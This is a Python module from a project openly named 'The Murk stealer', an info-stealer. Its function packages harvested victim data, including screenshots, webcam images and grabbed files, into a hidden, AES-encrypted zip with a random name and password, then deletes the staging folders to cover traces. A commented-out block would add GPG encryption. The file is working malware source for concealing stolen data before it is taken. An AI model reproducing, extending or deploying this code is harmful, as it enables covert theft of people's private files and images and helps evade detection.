#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import shutil
import os
import random
import pyzipper
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32api import SetFileAttributes
#import gnupg

def makemeZip(name,password,np):
	try:
		user = os.environ['USERPROFILE'].replace("C\\Users\\")
	except:
		dox = "qwertyuiopasdfghjklzxcvbnm1234567890"# symbols for pwd and name
		for i in range (40):
			name += dox[random.randint(0,len(dox)-1)]# generate name
		name = rf"{os.environ['USERPROFILE']}\AppData\Local\{name}"
		for i in range (60):
			password += dox[random.randint(0,len(dox)-1)]# generate pwd
		print(password)
		path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
		os.chdir(path)
		shutil.make_archive(fr'{path}\cache', 'zip', fr'{path}\windll')# make .zip
		SetFileAttributes(r'cache.zip', FILE_ATTRIBUTE_HIDDEN)# hide it
		#shutil.move(fr'{path}\cache.zip',"cache.zip")
		pwd = bytes(password, "UTF-8")
		print(pwd)
		with pyzipper.AESZipFile(f'{name}.zip','w',compression=pyzipper.ZIP_STORED,encryption=pyzipper.WZ_AES) as logs:# make .zip
			SetFileAttributes(f'{name}.zip', FILE_ATTRIBUTE_HIDDEN)
			logs.setpassword(pwd)# set pwd
			logs.write(r'cache.zip')# write
		"""
		clean all
		"""
		os.remove("cache.zip")
		try:
			shutil.rmtree(rf'{path}\windll\File-Grubber', ignore_errors=True)
		except:
			pass
		shutil.rmtree(rf'{path}\windll', ignore_errors=True)
		np.append(name)
		np.append(password)
		try:
			os.remove(rf'{path}\windll\sreenshot.jpg')
			os.remove(rf'{path}\windll\webcam.png')
		except:
			pass
		return np
	


		'''
		# Encrypt the zip file using a pre-defined public key
		gpg = gnupg.GPG()
		public_key = 'your_public_key_here'
		gpg.import_keys(public_key)
		with open(f'{name}.zip', 'rb') as f:
			encrypted_data = gpg.encrypt_file(f, recipients=None, always_trust=True)
		encrypted_file_name = 'encrypted.zip.gpg'
		with open(encrypted_file_name, 'wb') as f:
			f.write(encrypted_data.data)
			'''